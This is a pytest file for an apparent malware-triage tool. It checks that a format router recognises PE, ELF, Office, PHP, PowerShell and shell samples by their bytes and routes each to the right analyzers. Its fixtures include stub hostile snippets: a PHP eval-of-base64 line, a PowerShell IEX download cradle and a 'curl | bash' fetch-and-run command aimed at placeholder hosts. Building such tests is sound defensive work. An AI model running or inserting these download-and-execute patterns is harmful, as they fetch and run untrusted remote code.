"""The format router must dispatch PE, ELF, PHP, script, and Office samples to the
correct analyzer set (from structure, not extension alone)."""

from __future__ import annotations

import pytest

from sandworm.analyzers.registry import register_builtins
from sandworm.core.triage import (
    FORMAT_ELF,
    FORMAT_OFFICE,
    FORMAT_PE,
    FORMAT_PHP,
    FORMAT_SCRIPT_PS,
    FORMAT_SCRIPT_SH,
    analyzer_tags_for,
    identify,
)

PE = b"MZ\x90\x00" + b"\x00" * 60 + b"PE\x00\x00" + b"\x00" * 64
ELF = b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 64
OLE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64
PHP = b"<?php eval(base64_decode('aaaa')); ?>"
PS = b"$x = New-Object System.Net.WebClient; IEX $x.DownloadString('http://a')"
SH = b"#!/bin/bash\ncurl http://x | bash\nchmod +x /tmp/a\n"


@pytest.mark.parametrize(
    "data,name,expected",
    [
        (PE, "a.txt", FORMAT_PE),       # extension lies; bytes win
        (ELF, "a", FORMAT_ELF),
        (OLE, "invoice", FORMAT_OFFICE),
        (PHP, "x.php", FORMAT_PHP),
        (PS, "x.ps1", FORMAT_SCRIPT_PS),
        (SH, "x.sh", FORMAT_SCRIPT_SH),
    ],
)
def test_identify(data, name, expected):
    assert identify(data, name).fmt == expected


def test_macho_recognized_but_unsupported():
    macho = b"\xcf\xfa\xed\xfe" + b"\x00" * 64
    res = identify(macho, "bin")
    assert res.fmt == "macho"
    assert res.supported is False


def _analyzer_names_for(fmt: str) -> set[str]:
    reg = register_builtins()
    tags = analyzer_tags_for(fmt) | {"*"}
    names: set[str] = set()
    for tag in tags:
        for a in reg.for_format(tag, include_dynamic=False, isolated=False):
            names.add(a.name)
    return names


def test_router_dispatches_correct_static_analyzers():
    assert "static.pe" in _analyzer_names_for(FORMAT_PE)
    assert "static.elf" in _analyzer_names_for(FORMAT_ELF)
    assert "static.php" in _analyzer_names_for(FORMAT_PHP)
    assert "static.script" in _analyzer_names_for(FORMAT_SCRIPT_PS)
    assert "static.office" in _analyzer_names_for(FORMAT_OFFICE)
    # common runs on everything
    for fmt in (FORMAT_PE, FORMAT_ELF, FORMAT_PHP, FORMAT_SCRIPT_SH, FORMAT_OFFICE):
        assert "static.common" in _analyzer_names_for(fmt)


def test_php_not_routed_to_pe():
    assert "static.pe" not in _analyzer_names_for(FORMAT_PHP)
